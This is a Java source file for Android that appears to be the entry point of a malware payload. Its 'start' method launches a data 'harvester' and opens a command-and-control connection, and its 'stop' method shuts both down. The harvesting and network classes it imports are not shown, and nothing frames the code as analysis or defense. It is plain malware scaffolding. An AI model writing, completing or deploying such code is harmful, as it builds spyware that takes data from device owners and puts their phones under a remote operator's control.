package com.chameleon.payload;

import android.content.Context;
import android.util.Log;
import com.chameleon.payload.network.C2Connection;
import com.chameleon.payload.harvester.HarvesterManager;

public class PayloadEntry {
    private static final String TAG = "PayloadEntry";
    private static Context appContext;
    private static C2Connection c2;
    private static HarvesterManager harvesterManager;

    public static void start(Context context) {
        appContext = context.getApplicationContext();
        Log.i(TAG, "Payload starting...");

        harvesterManager = new HarvesterManager(appContext);

        c2 = new C2Connection(appContext, harvesterManager);
        c2.connect();

        Log.i(TAG, "Payload started successfully");
    }

    public static void stop() {
        if (c2 != null) c2.disconnect();
        if (harvesterManager != null) harvesterManager.stopAll();
        Log.i(TAG, "Payload stopped");
    }

    public static Context getContext() {
        return appContext;
    }

    public static C2Connection getC2() {
        return c2;
    }
}
